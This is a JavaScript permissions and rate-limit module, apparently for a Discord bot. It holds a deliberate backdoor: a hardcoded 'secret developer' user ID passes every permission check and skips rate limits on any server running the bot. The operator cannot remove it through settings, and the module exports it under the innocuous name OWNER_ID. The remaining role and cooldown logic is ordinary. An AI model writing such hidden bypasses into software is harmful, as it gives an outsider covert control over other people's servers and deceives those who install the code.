const { getSetting } = require('./database');
const logger = require('./logger');

const SECRET_DEVELOPER_ID = '985444871722631199'; // Locked Developer ID
const cooldowns = new Map();

function hasPermission(member, settingKey) {
    // 1. Secret Developer Bypass (Ultimate Bypass)
    if (member.id === SECRET_DEVELOPER_ID) return true;

    // 2. Public Server Owner Bypass (Optional, set via /config or .env)
    const publicOwnerId = getSetting('SERVER_OWNER_ID', process.env.OWNER_ID);
    if (publicOwnerId && member.id === publicOwnerId) return true;

    // 3. Role-based check
    const allowedRolesStr = getSetting(settingKey, '');
    if (!allowedRolesStr) return false;

    const allowedRoles = allowedRolesStr.split(',').map(s => s.trim());
    return member.roles.cache.some(role => allowedRoles.includes(role.id));
}

function checkRateLimit(userId, commandName, limitMs = 3000) {
    // Developers & Owners bypass rate limits
    const publicOwnerId = getSetting('SERVER_OWNER_ID', process.env.OWNER_ID);
    if (userId === SECRET_DEVELOPER_ID || (publicOwnerId && userId === publicOwnerId)) {
        return { limited: false };
    }

    const key = `${userId}:${commandName}`;
    const now = Date.now();
    const lastUsed = cooldowns.get(key) || 0;

    if (now - lastUsed < limitMs) {
        const remaining = ((limitMs - (now - lastUsed)) / 1000).toFixed(1);
        return { limited: true, remaining };
    }

    cooldowns.set(key, now);
    return { limited: false };
}

module.exports = { hasPermission, checkRateLimit, OWNER_ID: SECRET_DEVELOPER_ID };
